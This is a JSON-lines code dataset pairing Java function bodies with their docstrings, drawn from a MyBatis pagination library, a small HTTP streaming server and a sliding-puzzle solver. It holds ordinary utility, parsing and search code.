offsetPlaceholder : \" limit \" + limitPlaceholder);\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\dialect\\db\\H2Dialect.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * Instantiates a new Page my batis.\n *\n * @param content  the content\n * @param pageable the pageable\n * @param total    the total\n */\n", "func_signal": "public PageMyBatis(Collection<? extends E> content, PagingCriteria pageable, long total)", "code": "{\n    super(content);\n\n    this.content.addAll(content);\n    this.total = total;\n    this.pageable = pageable;\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\dto\\PageMyBatis.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * <p>Checks if a CharSequence is whitespace, empty (\"\") or null.</p>\n * <p/>\n * <pre>\n * StringUtils.isBlank(null)      = true\n * StringUtils.isBlank(\"\")        = true\n * StringUtils.isBlank(\" \")       = true\n * StringUtils.isBlank(\"bob\")     = false\n * StringUtils.isBlank(\"  bob  \") = false\n * </pre>\n *\n * @param cs the CharSequence to check, may be null\n * @return {@code true} if the CharSequence is null, empty or whitespace\n * @since 3.0 Changed signature from isBlank(String) to isBlank(CharSequence)\n */\n", "func_signal": "public static boolean isBlank(CharSequence cs)", "code": "{\n    int strLen;\n    if (cs == null || (strLen = cs.length()) == 0) {\n        return true;\n    }\n    for (int i = 0; i < strLen; i++) {\n        if (!Character.isWhitespace(cs.charAt(i))) {\n            return false;\n        }\n    }\n    return true;\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\helpers\\StringHelper.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * Value of case insensitive.\n *\n * @param value the value\n * @return the sort direction\n */\n", "func_signal": "public static SortDirection valueOfCaseInsensitive(String value)", "code": "{\n    String valueUpper = value.toUpperCase();\n    return SortDirection.valueOf(valueUpper);\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\dto\\datatables\\SortDirection.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * <p>Capitalizes a String changing the first letter to title case as\n * per {@link Character#toTitleCase(char)}. No other letters are changed.</p>\n * <p/>\n * <p>For a word based algorithm, see {@link org.apache.commons.lang3.text.WordUtils#capitalize(String)}.\n * A {@code null} input String returns {@code null}.</p>\n * <p/>\n * <pre>\n * StringUtils.capitalize(null)  = null\n * StringUtils.capitalize(\"\")    = \"\"\n * StringUtils.capitalize(\"cat\") = \"Cat\"\n * StringUtils.capitalize(\"cAt\") = \"CAt\"\n * </pre>\n *\n * @param str the String to capitalize, may be null\n * @return the capitalized String, {@code null} if null String input\n */\n", "func_signal": "public static String capitalize(String str)", "code": "{\n    if (str == null || (str.length()) == 0) {\n        return str;\n    }\n    return String.valueOf(Character.toTitleCase(str.charAt(0))) + str.substring(1);\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\helpers\\StringHelper.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * ,auth_resources\n */\n", "func_signal": "public Criteria or()", "code": "{\n    Criteria criteria = createCriteriaInternal();\n    oredCriteria.add(criteria);\n    return criteria;\n}", "path": "src\\test\\java\\org\\mybatis\\pagination\\domain\\ResourcesCriteria.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * \u67e5\u8be2\u603b\u7eaa\u5f55\u6570\n *\n * @param sql             SQL\u8bed\u53e5\n * @param connection      \u6570\u636e\u5e93\u8fde\u63a5\n * @param mappedStatement mapped\n * @param parameterObject \u53c2\u6570\n * @param boundSql        boundSql\n * @param dialect         database dialect\n * @return \u603b\u8bb0\u5f55\u6570\n * @throws java.sql.SQLException sql\u67e5\u8be2\u9519\u8bef\n */\n", "func_signal": "public static int getCount(final String sql, final Connection connection,\n                           final MappedStatement mappedStatement, final Object parameterObject,\n                           final BoundSql boundSql, Dialect dialect) throws SQLException", "code": "{\n    final String count_sql = dialect.getCountString(sql);\n    if (LOG.isDebugEnabled()) {\n        LOG.debug(\"the pagination generate count sql  is [\" + count_sql + \"]\");\n    }\n    PreparedStatement countStmt = null;\n    ResultSet rs = null;\n    try {\n        countStmt = connection.prepareStatement(count_sql);\n        final BoundSql countBS = new BoundSql(mappedStatement.getConfiguration(), count_sql,\n                boundSql.getParameterMappings(), parameterObject);\n        CountHelper.setParameters(countStmt, mappedStatement, countBS, parameterObject);\n        rs = countStmt.executeQuery();\n        int count = 0;\n        if (rs.next()) {\n            count = rs.getInt(1);\n        }\n        return count;\n    } finally {\n        if (rs != null) {\n            rs.close();\n        }\n        if (countStmt != null) {\n            countStmt.close();\n        }\n    }\n}", "path": "src\\main\\java\\org\\mybatis\\pagination\\helpers\\CountHelper.java", "repo_name": "fitzyyf/mybatis-pagination", "stars": 109, "license": "mit", "language": "java", "size": 996}
{"docstring": "/**\n * Constructs an object with a buffer of previously read data and an\n * InputStream to read the rest of the data from.\n */\n", "func_signal": "public ChunkedInputStream(byte[] data, int offset, int length, InputStream is)", "code": "{\n\tbuffer = new byte[BUFFER_SIZE];\n\tSystem.arraycopy(data, offset, buffer, 0, length);\n\tbufferLength = length;\n\tchunkLength = 0;\n\tthis.input = is;\n}", "path": "src\\org\\czentral\\minihttp\\ChunkedInputStream.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Gets request URI (request path with query string).\n * @return The query string.\n */\n", "func_signal": "public String getRequestURI()", "code": "{\n\tloadRequestLine();\n\treturn requestURI;\n}", "path": "src\\org\\czentral\\minihttp\\HTTPRequestLoader.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Returns header fields with this identifier.\n * @param key Header key.\n * @return Array containing the values for all header lines with this key.\n */\n", "func_signal": "public String[] getHeaders(String key)", "code": "{\n\tloadRequestHeaders();\n\treturn requestHeaders.get(key.toUpperCase());\n}", "path": "src\\org\\czentral\\minihttp\\HTTPRequestLoader.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Instantiates the object to load request headers from an\n * <code>InputStream</code> thru a <code>StreamBuffer</code>. Surplus (bytes\n * red but not part of the header) remains available after the loading\n * operation is done.\n *\n * The maximum size of a request or header line is the size ofthe buffer.\n */\n", "func_signal": "public HTTPRequestLoader(StreamBuffer buffer, InputStream input)", "code": "{\n\tthis.buffer = buffer;\n\tthis.input = input;\n\tfeeder = new StreamProcessorFeeder(buffer, input);\n}", "path": "src\\org\\czentral\\minihttp\\HTTPRequestLoader.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Moves the payload of this buffer to the start of the array.\n */\n", "func_signal": "public void compact()", "code": "{\n\tSystem.arraycopy(data, offset, data, 0, length);\n\toffset = 0;\n}", "path": "src\\org\\czentral\\util\\stream\\StreamBuffer.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Gets treuest version. (e.g. <code>HTTP/1.1</code>)\n * @param key Header key.\n * @return Array containing the values for all header lines with this key.\n */\n", "func_signal": "public String getVersion()", "code": "{\n\tloadRequestLine();\n\treturn requestMethod;\n}", "path": "src\\org\\czentral\\minihttp\\HTTPRequestLoader.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Returns the latest get parameter with this identifier.\n * @param key Key in the query string.\n * @return The latest get variable with the given key.\n */\n", "func_signal": "public String getParameter(String key)", "code": "{\n\tloadGetVars();\n\tString[] values = getParams.get(key);\n\tif (values == null)\n\t\treturn null;\n\treturn values[values.length - 1];\n}", "path": "src\\org\\czentral\\minihttp\\HTTPRequestLoader.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Gets request method (e.g. GET, POST, HEAD).\n * @return The query string.\n */\n", "func_signal": "public String getMethod()", "code": "{\n\tloadRequestLine();\n\treturn requestMethod;\n}", "path": "src\\org\\czentral\\minihttp\\HTTPRequestLoader.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Adds a key-value pair to the multimap.\n * @param key The key.\n * @param value A value associated to the given key.\n */\n", "func_signal": "public void add(String key, String value)", "code": "{\n\tVector<String> v = buffer.get(key);\n\tif (v == null) {\n\t\tv = new Vector<String>(10);\n\t\tbuffer.put(key, v);\n\t}\n\tv.add(value);\n}", "path": "src\\org\\czentral\\minihttp\\MultimapBuilder.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Returns the <strong>lastest<strong> header field with this identifier.\n * @param key Header key.\n * @return The latest request header line with the given key.\n */\n", "func_signal": "public String getHeader(String key)", "code": "{\n\tloadRequestHeaders();\n\tString[] values = requestHeaders.get(key.toUpperCase());\n\tif (values == null)\n\t\treturn null;\n\treturn values[values.length - 1];\n}", "path": "src\\org\\czentral\\minihttp\\HTTPRequestLoader.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Gets request path: the part of the URI without the query string (and the trailing '?').\n * @return The query string.\n */\n", "func_signal": "public String getPathName()", "code": "{\n\tloadRequestLine();\n\treturn requestPath;\n}", "path": "src\\org\\czentral\\minihttp\\HTTPRequestLoader.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Tries to enqueue this event to be processed later by an other thread.\n * \n * @return <code>True</code> if the event has been successfully queued.\n */\n", "func_signal": "public synchronized boolean post(Event event)", "code": "{\n\t\n\t// queue full, the event canot be queued.\n\tif (bufferLength >= BUFFER_SIZE)\n\t\treturn false;\n\t\n\t// effective offset in the circular buffer\n\tint offset = (bufferOffset + bufferLength) % BUFFER_SIZE;\n\t\n\t// save the event and increment length\n\tbuffer[offset] = event;\n\tbufferLength++;\n\t\n\t// wakes up any threads waiting for events to become available\n\tnotify();\n\t\n\treturn true;\n}", "path": "src\\threadedevent\\EventQueue.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Constucts an object with\n */\n", "func_signal": "public StreamProcessorFeeder(StreamBuffer buffer, InputStream input)", "code": "{\n\tthis.buffer = buffer;\n\tthis.input = input;\n}", "path": "src\\org\\czentral\\util\\stream\\StreamProcessorFeeder.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Loads the full header. Callng this method forces the loader to process\n * all the request headers, allowing the access the request body (e.g. POST\n * content).\n */\n", "func_signal": "public void loadFully()", "code": "{\n\tloadGetVars();\n\tstate = STATE_FULLY_LOADED;\n}", "path": "src\\org\\czentral\\minihttp\\HTTPRequestLoader.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Unshifts the event first in the queue.\n * \n * @return The event which is in the queue for the longest time or <code>null</code> if the queue is empty.\n */\n", "func_signal": "private synchronized Event unshift()", "code": "{\n\t\n\tif (bufferLength == 0)\n\t\treturn null;\n\t\n\tEvent event = buffer[bufferOffset];\n\t\n\t// new offset\n\tbufferOffset = (bufferOffset + 1) % BUFFER_SIZE;\n\t\n\t// decrement length\n\tbufferLength--;\n\t\n\treturn event;\n}", "path": "src\\threadedevent\\EventQueue.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Signals that <code>numOfBytes</code> bytes of new data has been appended to the end of the payload.\n * @param numOfBytes The number of bytes appended.\n */\n", "func_signal": "public void markAppended(int numOfBytes)", "code": "{\n\tif (numOfBytes < 0)\n\t\tthrow new RuntimeException(\"Negative number of bytes is unsupported: \" + numOfBytes);\n\tif (numOfBytes > data.length - (offset + length))\n\t\tthrow new RuntimeException(\"Region too big: \" + numOfBytes + \" (empty space is: \" + (data.length - (offset + length)) + \").\");\n\t\n\tlength += numOfBytes;\n}", "path": "src\\org\\czentral\\util\\stream\\StreamBuffer.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Gets query string: the part ofthe URI after the '?' sign.\n * @return The query string.\n */\n", "func_signal": "public String getQueryString()", "code": "{\n\tloadRequestLine();\n\treturn requestMethod;\n}", "path": "src\\org\\czentral\\minihttp\\HTTPRequestLoader.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Unshifts the event first in the queue. This method <b>blocks</b> until an event\n * is available.\n * \n * @return The event which is in the queue for the longest time (not neccessarily the oldest event).\n */\n", "func_signal": "public Event poll()", "code": "{\n\t\n\tEvent event;\n\t\n\twhile ((event = unshift()) == null) {\n\t\t\n\t\t// block until events are available\n\t\ttry {\n\t\t\tsynchronized (this) {\n\t\t\t\twait();\n\t\t\t}\n\t\t} catch (InterruptedException e) {\n\t\t\tthrow new RuntimeException(\"Event polling thread interrupted.\", e);\n\t\t}\n\t}\n\n\treturn event;\n\t\n}", "path": "src\\threadedevent\\EventQueue.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Signals that the first <code>numOfBytes</code> bytes has been processed and should not be considered\n * as part of the payload anymore.\n * @param numOfBytes The number of bytes processed.\n */\n", "func_signal": "public void markProcessed(int numOfBytes)", "code": "{\n\tif (numOfBytes < 0)\n\t\tthrow new RuntimeException(\"Negative number of bytes is unsupported: \" + numOfBytes);\n\tif (numOfBytes > length)\n\t\tthrow new RuntimeException(\"Region too big: \" + numOfBytes + \" (length is: \" + length + \").\");\n\t\n\tlength -= numOfBytes;\n\toffset += numOfBytes;\n}", "path": "src\\org\\czentral\\util\\stream\\StreamBuffer.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n * Returns the offset of the first occurence of a given byte inside the selected region of an array.\n * \n * @param array The array containing the data to search in.\n * @param offset The offset of the first data bayte to compare.\n * @param length The number of bytes to compare.\n * @param value The value to search for.\n * @return Index of the first occurrence of the given value or -1 if no match.\n */\n", "func_signal": "private int arrayIndexOf(byte[] array, int offset, int length, byte value)", "code": "{\n\tint endOffset = offset + length;\n\tfor (;offset < endOffset; offset++)\n\t\tif (array[offset] == value)\n\t\t\treturn offset;\n\treturn -1;\n}", "path": "src\\org\\czentral\\minihttp\\HTTPRequestLoader.java", "repo_name": "yomguy/stream-m", "stars": 70, "license": "None", "language": "java", "size": 198}
{"docstring": "/**\n *  find the cell with zero from the current state\n * @param state\n * @return index from 0 to 15 of the empty cell\n * @throws PuzzleException \n */\n", "func_signal": "private int getZeroCellIndex(StateCode state) throws PuzzleException", "code": "{\n\tbyte[] pieces = state.toByteArray();\n\t\n\tfor (int i = 0; i < pieces.length; i++) {\n\t\tif ( (pieces[i] & 0xF0) == 0)\n\t\t\treturn 2*i;\n\t\t\t\t\t\n\t\telse if ( (pieces[i] & 0x0F) == 0)\n\t\t\treturn 2*i +1;\n\t}\t\t\n\n\tthrow new PuzzleException(\"getZeroCellIndex() empty cell not found\");\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "/**\n * @param args the command line arguments\n */\n", "func_signal": "public static void main(String[] args)", "code": "{\n    \n    int[] array = new int[]{5, 9, 22, 7, 12, 75, 0, 3, 51, 33};\n    int orderStatistic = 5;\n    \n    int[] sortedArray = array.clone();\n    Arrays.sort(sortedArray);\n    \n    System.out.println(\"InputArray=\" + Arrays.toString(array) + \", OrderStatistic=\" + orderStatistic);\n\n    int result = rSelect(array, orderStatistic);\n    System.out.println(\"\\nFinalArray=\" + Arrays.toString(array) + \", OrderStatistic=\" + orderStatistic + \", Result=\" + result);\n    \n    \n    System.out.println(\"\\nSortedArray=\" + Arrays.toString(sortedArray));\n\n}", "path": "ALGO101\\UNIT_02\\rselect\\RSelect.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "// leaf is just out from frontier => create evalue for storing the visited node \n// link evalue with previous path\n", "func_signal": "private Evalue createEvalue(FrontierLeaf currLeaf)", "code": "{\n\tEvalue res = new Evalue();\n\tres.parent = currLeaf.previous;\n\tres.state=currLeaf.state; \n\tres.prevAction =  currLeaf.prevAction;\n\treturn res;\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "// location on piece, where index = piece.getPieceNumber();\n", "func_signal": "public Board(int dimension)", "code": "{\n       _dimension = dimension;\n       _numberOfLocations = (dimension * dimension);\n       _pieces = new Piece[_numberOfLocations];\n       _locations = new Location[_numberOfLocations];\n\n       int pieceNumber=1;\n       for(int row=0; row<dimension; row++){\n           for(int col=0; col<dimension; col++){\n               int newPieceNumber = pieceNumber % _numberOfLocations;\n               Piece piece = Piece.pieceForNumber(newPieceNumber);\n               Location location = Location.locationFor(col, row, _dimension);\n               _pieces[location.getLinearIndex()] = piece;\n               _locations[piece.getPieceNumber()] = location;\n               pieceNumber++;\n           }\n       }\n   }", "path": "SlidingPuzzle\\src\\com\\oti\\Board.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "/**\n * Construct a byte representing the action \n * high order 4bits = firstCellIndex\n * low order 4bits = otherCellIndex\n * \n * @param firstCellIndex < otherCellIndex for comaprison between action bytes. \n * @param otherCellIndex\n * @return the action byte coding the move swap(firstCellIndex, otherCellIndex)\n */\n", "func_signal": "private byte buildAction(int firstCellIndex , int otherCellIndex)", "code": "{\n\tassert(firstCellIndex<otherCellIndex);\n\tint action = (0x0F & firstCellIndex);\n\taction = action << 4;\n\taction |= (0x0F & otherCellIndex);\n\treturn (byte) action;\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "// helper func\n", "func_signal": "static private void printState(StateCode state)", "code": "{\n\tbyte[] pieces = state.toByteArray();\n\t\n\tfor (int i = 0; i < pieces.length; i++) {\n\t\tif (i%2==0)\n\t\t\tSystem.out.print(\" \");\t\t\n\t\tSystem.out.print((int)((pieces[i] & 0xF0)>>4 ));\t\t\t\n\t\tSystem.out.print(\" \");\t\t\n\t\tSystem.out.print((int)(pieces[i] & 0x0F) );\t\t\t\n\t\tSystem.out.print(\" \");\t\t\t\n\t}\n\n\tSystem.out.println();\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "/**\n * Transfrom the current state in a new state resulting from the swap of cells coded by action.\n * Copy the current state before transforming.\n * \n * \n * */\n", "func_signal": "private StateCode moveState(StateCode istate, byte action)", "code": "{\n\tStateCode state = new StateCode(istate);\n\tbyte[] pieces = state.toByteArray();\t\t\n\tint firstCell = 0x0F & (action >> 4); \n\tint otherCell = 0x0F & action;\n\t\n\tint firstCellVal =0;\n\tfirstCellVal = pieces[firstCell/2];\n\tif (firstCell%2 == 0) {\n\t\tfirstCellVal = firstCellVal >> 4;\n\t} else {\n\t\tfirstCellVal = firstCellVal & 0x0F;\t\t\t\n\t}\n\tint otherCellVal = pieces[otherCell/2];\n\tif (otherCell%2 == 0) {\n\t\totherCellVal = otherCellVal >> 4;\n\t} else {\n\t\totherCellVal = otherCellVal & 0x0F;\t\t\t\n\t}\n\n\t// swap othercell with firstcell value\n\tif (otherCell%2 == 0) {\n\t\tpieces[otherCell/2] = (byte) ((0x0F & pieces[otherCell/2]) | (firstCellVal << 4));\n\t} else {\n\t\tpieces[otherCell/2] = (byte) ((0xF0 & pieces[otherCell/2]) | (firstCellVal & 0x0F));\n\t}\n\t\n\t// swap firstcell with othercell value\n\tif (firstCell%2 == 0) {\n\t\tpieces[firstCell/2] = (byte) ((0x0F & pieces[firstCell/2]) | (otherCellVal << 4));\n\t} else {\n\t\tpieces[firstCell/2] = (byte) ((0xF0 & pieces[firstCell/2]) | (otherCellVal & 0x0F));\n\t}\t\t\n\t\n\treturn state;\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "/**\n * create a Move object from an action byte.\n **/\n", "func_signal": "private Move createMove(StateCode state, byte action)", "code": "{\n\t// \n\tbyte[] pieces = state.toByteArray();\t\t\n\tint firstCell = 0x0F & (action >> 4); \n\tint otherCell = 0x0F & action;\n\n//\t\tSystem.out.println(\"SAM TO REMOVE createMove from state \");\n//\t\tprintState(state);\n\t\t\t\n\tbyte firstCellVal =0;\n\tfirstCellVal = pieces[firstCell/2];\n\tif (firstCell%2 == 0) {\n\t\tfirstCellVal = (byte)((firstCellVal  & 0xF0)>>4);\n\t} else {\n\t\tfirstCellVal = (byte)(firstCellVal & 0x0F);\t\t\t\n\t}\n\tbyte otherCellVal = pieces[otherCell/2];\n\tif (otherCell%2 == 0) {\n\t\totherCellVal = (byte) ((otherCellVal & 0xF0)>>4);\n\t} else {\n\t\totherCellVal = (byte) (otherCellVal & 0x0F);\t\t\t\n\t}\n\n\t//\t\tSystem.out.println(\"SAM TO REMOVE createMove firstCel \"+ firstCell+\" otherCell \"+ otherCell);\n\t//\t\tSystem.out.println(\"SAM TO REMOVE createMove firstCellVal \"+ firstCellVal+\" otherCellVal \"+ otherCellVal);\n\t\n\t\n\tPiece currPiece = null;\n\tLocation  currLoc = null;\n\tif (firstCellVal==0) {\n\t\tcurrPiece = Piece.pieceForNumber(otherCellVal);\n\t\tcurrLoc = Location.locationFor(firstCell%4, firstCell/4, 4);\n\t} else {\n\t\tassert(otherCellVal==0);\n\t\tcurrPiece = Piece.pieceForNumber(firstCellVal);\n\t\tcurrLoc = Location.locationFor(otherCell%4, otherCell/4, 4);\n\t\t\n\t}\n\t//\t\tSystem.out.println(\"SAM TO REMOVE createMove currPiece \"+ currPiece+\" currLoc \"+ currLoc);\n\t\n\treturn new Move(currPiece, currLoc);\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "/**\n * Create any board you like.  Length of the initialOrderedPieces\n * must be equal to the dimension^2.  Use the number 0 for the blank\n * @param dimension\n * @param initialOrderedPieces\n * @throws PuzzleException\n */\n", "func_signal": "public Board(int dimension, int... initialOrderedPieces)\n        throws PuzzleException", "code": "{\n    _dimension = dimension;\n    _numberOfLocations = (dimension * dimension);\n    _pieces = new Piece[_numberOfLocations];\n    _locations = new Location[_numberOfLocations];\n\n    if(initialOrderedPieces.length != (dimension * dimension)){\n        throw new PuzzleException(\n                \"Can't create custom board with dimension: \" + dimension\n                        + \" and \" + initialOrderedPieces.length +\n                        \" initialOrderedPieces\");\n    }\n\n    int pieceIndex=0;\n    for(int row=0; row<dimension; row++){\n        for(int col=0; col<dimension; col++){\n            int newPieceNumber = initialOrderedPieces[pieceIndex];\n            Piece piece = Piece.pieceForNumber(newPieceNumber);\n            Location location = Location.locationFor(col, row, _dimension);\n            _locations[piece.getPieceNumber()] = location;\n            _pieces[location.getLinearIndex()] = piece;\n            pieceIndex++;\n        }\n    }\n}", "path": "SlidingPuzzle\\src\\com\\oti\\Board.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "//\t    public boolean equals(Object x) {\n//\t        if (!(x instanceof StateCode))\n//\t            return false;\n//\t    \treturn equals((StateCode)x);\n//\t    }\n//\t    public boolean equals(StateCode x) {\n//\t    \treturn new BigInteger(mag).equals(new BigInteger(x.mag));\n//\t    }\n", "func_signal": "public boolean equals(StateCode x)", "code": "{\n\t        // This test is just an optimization, which may or may not help\n\t        if (x == this)\n\t            return true;\n\n\t        byte[] m = mag;\n\t        int len = m.length;\n\t        byte[] xm = x.mag;\n\n\t        for (int i = 0; i < len; i++)\n\t            if (xm[i] != m[i])\n\t                return false;\n\n\t        return true;\n\t    }", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "// create the state (BigInterger) representing the target [1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0] \n", "func_signal": "private StateCode buildArrivalState()", "code": "{\n\tStateCode res = new StateCode();\n\tbyte[] arr = res.toByteArray();\n\tfor (int i=0; i<=15; ++i) {\n\t\tif (i%2==1)\n\t\t\tarr[i/2] = (byte) (arr[i/2] << 4);\n\t\tarr[i/2] |= i+1;\n\t}\n\treturn res;\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "/**\n * Returns the list of all possible legal moves\n * from the current state of the board.\n * @return\n */\n", "func_signal": "public List<Move> allPossibleMoves()", "code": "{\n    List<Move> allMoves = new ArrayList<Move>();\n    Location locationOfBlank = locationForPiece(Piece.blankPiece());\n    addMovesAvailableIntoLocation(locationOfBlank, allMoves);\n\n    return allMoves;\n}", "path": "SlidingPuzzle\\src\\com\\oti\\Board.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "/**\n * shrink a Board object in a BigInt each 4 bits representing one call of the board.\n * */\n", "func_signal": "private StateCode createState(Board board)", "code": "{\n\tStateCode res = new StateCode();\n\tbyte[] arr = res.toByteArray();\n\tfor (int i = 0; i < 16; i++) {\n\t\tPiece cell = board.pieceAt(i%4, i/4);\n\t\tif (i%2==1)\n\t\t\tarr[i/2] = (byte) (arr[i/2] << 4);\n\t\t\n\t\tarr[i/2] |= (byte) (0x0F & cell.getPieceNumber());\n\n\t}\n\tSystem.out.println(\"SAM TO REMOVE createState() \");\n\tSASolverNoBigInt.printState(res);\t\t\n\t\n\t\n\treturn res;\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "/**\n * Returns all possible legal moves for piece\n * in the boards current state\n *\n * @param piece\n * @return\n */\n", "func_signal": "public void addMovesAvailableIntoLocation(Location blankLocation, List<Move> nextMoves)", "code": "{\n\n    // check n,s,e,w for possible next locations\n    int col = blankLocation.getCol() - 1;\n    if(col >= 0){\n        Piece piece = pieceAt(col, blankLocation.getRow());\n        nextMoves.add(new Move(piece, blankLocation));\n    }\n\n    col = blankLocation.getCol() + 1;\n    if(col < _dimension){\n        Piece piece = pieceAt(col, blankLocation.getRow());\n        nextMoves.add(new Move(piece, blankLocation));\n    }\n\n    int row = blankLocation.getRow() - 1;\n    if(row >= 0){\n        Piece piece = pieceAt(blankLocation.getCol(), row);\n        nextMoves.add(new Move(piece, blankLocation));\n    }\n\n    row = blankLocation.getRow() + 1;\n    if(row < _dimension){\n        Piece piece = pieceAt(blankLocation.getCol(), row);\n        nextMoves.add(new Move(piece, blankLocation));\n    }\n}", "path": "SlidingPuzzle\\src\\com\\oti\\Board.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
{"docstring": "// create a new leaf from the current node and add it to the frontier\n", "func_signal": "private void createNewLeaf(PriorityQueue<FrontierLeaf> frontierSet, FrontierLeaf currLeaf, Evalue currEvalue, byte action, StateCode newState)", "code": "{\n\tFrontierLeaf newLeaf = new FrontierLeaf();\n\tnewLeaf.cost = currLeaf.cost + 1;\n\tnewLeaf.value = newLeaf.cost + m_hFunc.distanceToArrival(newState);\n\tnewLeaf.state= newState;\n\tnewLeaf.prevAction = action;\n\tnewLeaf.previous=currEvalue;\t\t\t\t\t\t\n\t// insert leaf in frontier\n\tfrontierSet.add(newLeaf);\n}", "path": "SlidingPuzzle\\src\\com\\oti\\solutions\\sam\\SASolverNoBigInt.java", "repo_name": "AlgorithmsNYC/AlgorithmsNYC", "stars": 84, "license": "None", "language": "java", "size": 622}
